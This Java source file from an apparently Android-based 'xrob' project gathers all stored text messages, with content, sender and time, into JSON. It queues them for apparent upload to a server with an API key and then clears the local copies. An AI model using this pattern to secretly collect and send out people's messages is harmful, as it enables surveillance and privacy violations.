package com.theah64.xrob.asynctasks;

import android.annotation.SuppressLint;
import android.content.Context;

import com.theah64.xrob.database.Messages;
import com.theah64.xrob.database.PendingDeliveries;
import com.theah64.xrob.models.Message;
import com.theah64.xrob.models.PendingDelivery;
import com.theah64.xrob.utils.Xrob;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.List;

/**
 * Created by theapache64 on 29/9/16.
 */

public class MessagesSynchronizer extends BaseJSONPostNetworkAsyncTask<Void> {

    public MessagesSynchronizer(Context context, String apiKey) {
        super(context, apiKey);
    }

    @Override
    protected Void doInBackground(String... strings) {

        final Messages messages = Messages.getInstance(getContext());

        //Adding messages to pending delivery queue
        final List<Message> messagesToSync = messages.getAll();

        if (messagesToSync != null) {

            final PendingDeliveries pds = PendingDeliveries.getInstance(getContext());

            try {
                final JSONArray jaMessagesData = convertToJSON(messagesToSync);

                //Converting to json
                @SuppressLint("DefaultLocale")
                final PendingDelivery pd = new PendingDelivery(
                        null, false,
                        Xrob.DATA_TYPE_MESSAGES,
                        jaMessagesData.toString(),
                        String.format("%d message(s) retrieved", messagesToSync.size())
                );

                final boolean isAdded = pds.add(pd) != -1;
                if (isAdded) {
                    //Deleting data from
                    messages.deleteAll();
                } else {
                    pds.add(new PendingDelivery(null, true, Xrob.DATA_TYPE_MESSAGES, null, "Failed to add messages to pending delivery."));
                }

            } catch (JSONException e) {
                e.printStackTrace();
            }

        }

        return null;
    }

    private static JSONArray convertToJSON(List<Message> messagesToSync) throws JSONException {
        final JSONArray jaMessages = new JSONArray();

        //Looping through each node.
        for (final Message message : messagesToSync) {
            final JSONObject joMessage = new JSONObject();

            joMessage.put(Messages.COLUMN_ANDROID_MESSAGE_ID, message.getAndroidId());
            joMessage.put(Messages.COLUMN_CONTENT, message.getContent());
            joMessage.put(Messages.COLUMN_TYPE, message.getType());
            joMessage.put(Messages.COLUMN_FROM, message.getFrom());
            joMessage.put(Messages.COLUMN_DELIVERY_TIME, message.getDeliveryTime());

            jaMessages.put(joMessage);
        }

        return jaMessages;
    }
}
